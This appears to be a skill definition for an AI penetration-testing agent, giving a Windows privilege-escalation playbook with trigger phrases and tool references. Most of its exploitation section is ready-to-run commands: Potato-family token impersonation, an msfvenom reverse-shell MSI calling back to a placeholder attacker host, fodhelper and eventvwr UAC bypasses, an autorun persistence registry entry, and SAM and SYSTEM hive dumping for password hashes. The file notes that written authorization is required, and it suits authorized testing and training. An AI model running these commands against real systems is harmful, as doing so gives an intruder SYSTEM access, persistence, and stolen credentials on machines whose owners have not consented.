---
name: windows-privesc
description: "Windows privilege escalation methodology: token impersonation, unquoted service paths, DLL hijacking, AlwaysInstallElevated, and UAC bypass"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["windows privilege escalation", "uac bypass", "token impersonation", "juicypotato", "printspoofer", "unquoted service path", "dll hijacking", "alwaysinstallelevated", "registry autorun", "potato", "seimpersonate", "windows privesc"]
mitreAttack: ["T1548", "T1574", "T1134"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Windows Privilege Escalation

## When to Use

- You have a standard user shell on Windows and need to escalate to SYSTEM or Administrator
- You are assessing privilege escalation paths during a penetration test
- You need to understand the risk of weak service configurations
- Testing UAC effectiveness and token impersonation defenses

## Do Not Use

- Against production systems without explicit written authorization
- To escalate privileges on systems you do not own or have permission to test
- On domain controllers without explicit approval (risk of AD corruption)

## Auth Context

For web-based initial access, use **httpRequest** with **getCapturedHeaders** for auth context. Token impersonation requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.

---

## Phase 1: Enumeration

### System Information

```powershell
systeminfo | findstr /B "OS Name OS Version Hostname"
whoami /priv
whoami /groups
hostname
```

### Service Enumeration

```powershell
# List services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """"

# Check service permissions
sc.exe query
sc.exe qc <service_name>

# Services running as SYSTEM
Get-CimInstance Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, PathName
```

### AlwaysInstallElevated

```powershell
# Check if AlwaysInstallElevated is set
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both return 0x1, any user can install MSI as SYSTEM
```

### Autorun Programs

```powershell
# Check autorun programs with weak permissions
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Check if any autorun binary is writable
```

### DLL Search Order Hijacking

```powershell
# Find DLLs loaded by services that are writable
# Use Process Monitor to identify DLL load attempts
# Look for DLLs in writable directories or with weak ACLs
```

### Token Privileges

```powershell
# Check for impersonation privileges
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken SeDebug"
# SeImpersonatePrivilege = Potato attack vector
# SeDebugPrivilege = can open any process
```

---

## Phase 2: Exploitation

### Token Impersonation (Potato Family)

```powershell
# JuicyPotato — requires SeImpersonatePrivilege, works on Windows 8-2016
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}

# PrintSpoofer — Windows 10/Server 2016+
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "c:\windows\system32\cmd.exe" -i

# GodPotato — Windows 8-2022
GodPotato.exe -cmd "cmd /c whoami"

# SweetPotato
SweetPotato.exe -p c:\windows\system32\cmd.exe

# RoguePotato — works across network pivots
RoguePotato.exe -r attacker_ip -l 1337 -p cmd.exe
```

### Unquoted Service Path

```powershell
# If service path is: C:\Program Files\My Service\service.exe
# Windows searches: C:\Program.exe → C:\Program Files\My.exe → C:\Program Files\My Service\service.exe
# Place malicious exe at: C:\Program.exe
sc create "VulnService" binPath="C:\Program Files\My Service\service.exe" start=auto
```

### DLL Hijacking

```powershell
# Identify missing DLLs that services try to load
# Use Process Monitor with filter: Result = NAME NOT FOUND
# Place malicious DLL in the search path
# Common targets: C:\Windows\Temp\, writable PATH directories
```

### AlwaysInstallElevated

```powershell
# Generate malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=attacker IP LPORT=4444 -f msi -o evil.msi
# Execute as standard user — installs as SYSTEM
msiexec /quiet /qn /i evil.msi
```

### UAC Bypass

```powershell
# fodhelper.exe bypass (Windows 10)
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
# Launch fodhelper → executes cmd.exe elevated

# eventvwr.exe bypass
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
# Launch eventvwr → executes cmd.exe elevated

# CMSTP bypass
cmstp.exe /s evil.inf
```

### Registry Autorun

```powershell
# If autorun binary is writable, replace it
# Or modify registry to point to malicious binary
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\evil.exe" /f
```

### SAM Database Extraction

```powershell
# Extract SAM hashes (requires SYSTEM or backup operator)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
# Dump hashes with mimikatz or secretsdump
```

---

## Cheat Sheet — Quick Reference

| Vector | Command |
|--------|---------|
| Potato (SeImpersonate) | `JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {F7FD3FD6-...}` |
| PrintSpoofer | `PrintSpoofer.exe -i -c cmd` |
| Unquoted path | Place exe at `C:\Program.exe` |
| AlwaysInstallElevated | `msiexec /quiet /qn /i evil.msi` |
| UAC fodhelper | `reg add HKCU\...\ms-settings\shell\open\command /d "cmd.exe"` |
| SAM extraction | `reg save HKLM\SAM C:\temp\SAM` |

---

## Anti-Hallucination

- Always verify the Windows version and patch level before selecting an exploit technique
- UAC bypass techniques are version-specific — what works on Windows 10 may not work on Windows 11
- Potato attacks require SeImpersonatePrivilege — verify with `whoami /priv` first
- Document the exact service name, path, and permissions for each finding
- A writable binary does not automatically mean SYSTEM access — trace the execution context
